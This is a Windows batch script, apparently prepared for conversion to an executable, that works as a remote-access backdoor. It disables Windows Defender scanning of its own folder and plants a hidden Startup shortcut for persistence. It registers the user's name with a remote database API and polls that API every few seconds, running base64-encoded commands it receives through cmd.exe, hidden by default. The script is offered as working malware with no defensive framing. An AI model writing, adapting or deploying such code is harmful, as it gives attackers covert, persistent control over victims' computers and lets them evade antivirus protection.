::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFAJBTQqHAES0A5EO4f7+086IoVgQUewra7PNybeBJOUv+FDqSYQ42DRfgM5s
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
setlocal enabledelayedexpansion

set "BASE_URL="
set "API_KEY="

set "scriptName=run"
set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%scriptName%.lnk"

if "%1"=="--startup" goto :main
if exist "%APPDATA%\%scriptName%.dat" exit /b

powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'" 2>nul
if !ERRORLEVEL! EQU 0 (
  powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%shortcutPath%'); $Shortcut.TargetPath = '%~f0'; $Shortcut.Arguments = '--startup'; $Shortcut.WindowStyle = 7; $Shortcut.Save()"
  echo installed > "%APPDATA%\%scriptName%.dat"
  
  call :register
  goto :main
)
exit /b

:main
powershell -Command "$h = @{ 'apikey' = '!API_KEY!'; 'Authorization' = 'Bearer !API_KEY!'; 'Content-Type' = 'application/json'; 'Prefer' = 'return=representation'; 'Accept' = 'application/vnd.pgrst.object+json' }; $u = '!BASE_URL!/clients?username=eq.!USERNAME!'; $r = Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{\"updated_at\": \"now()\"}'; if ($r.run -eq $true) { Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{\"run\": false}'; $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r.cmd)); $s = if ($r.visible -eq $true) { 'Normal' } else { 'Hidden' }; Start-Process cmd.exe -ArgumentList '/c', $c -WindowStyle $s; }"
timeout /t 4 /nobreak >nul
goto main

:register
curl -s -X POST "!BASE_URL!/clients" ^
-H "apikey: !API_KEY!" ^
-H "Authorization: Bearer !API_KEY!" ^
-H "Content-Type: application/json" ^
-H "Prefer: resolution=merge-duplicates" ^
-d "{\"username\": \"!USERNAME!\"}" >nul
exit /b
